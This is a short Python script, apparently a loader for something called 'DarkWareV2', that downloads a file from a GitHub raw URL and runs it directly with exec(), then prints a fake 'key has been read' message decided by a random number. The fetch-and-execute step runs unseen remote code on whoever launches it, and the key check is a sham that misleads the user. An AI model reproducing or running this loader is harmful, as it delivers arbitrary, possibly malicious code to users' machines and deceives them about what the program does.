import requests
import random

print("Starting script...")

raw_url = "https://raw.githubusercontent.com/DarkWareV2/DarkWareV2Scripts/main/DarkWareV2Ui.py"

try:
    print("Fetching script...")
    response = requests.get(raw_url)
    response.raise_for_status()  
    print("Script fetched successfully.")

    print("Executing fetched script...")
    exec(response.text)
    print("Script executed successfully.")

except requests.RequestException as e:
    print(f"Error fetching script: {e}")

except Exception as e:
    print(f"Error executing script: {e}")

print("Determining key read status...")

# 0.1% chance to print "key has been successfully read"
if random.random() < 0.001:
    print("key has been successfully read")
else:
    print("key has been unsuccessfully read")

print("Script finished.")
